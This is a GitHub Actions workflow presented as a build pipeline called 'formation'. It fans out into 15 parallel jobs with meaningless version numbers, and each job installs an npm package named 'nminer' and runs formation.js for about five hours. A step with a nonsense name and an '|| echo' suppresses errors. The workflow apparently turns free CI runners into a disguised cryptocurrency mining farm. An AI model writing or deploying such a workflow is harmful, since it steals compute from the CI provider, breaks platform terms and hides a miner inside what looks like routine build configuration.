name: formation
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 250 }
          - { version: 1830 }
          - { version: 5520 }
          - { version: 8016 }
          - { version: 6600 }
          - { version: 1626 }
          - { version: 1738 }
          - { version: 1693 }
          - { version: 1559 }
          - { version: 9412 }
          - { version: 8897 }
          - { version: 3083 }
          - { version: 3859 }
          - { version: 1375 }
          - { version: 3810 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: peony rejoin phew onto
        run: |
          npm install nminer@latest
          timeout 308m node formation.js || echo "formation executed"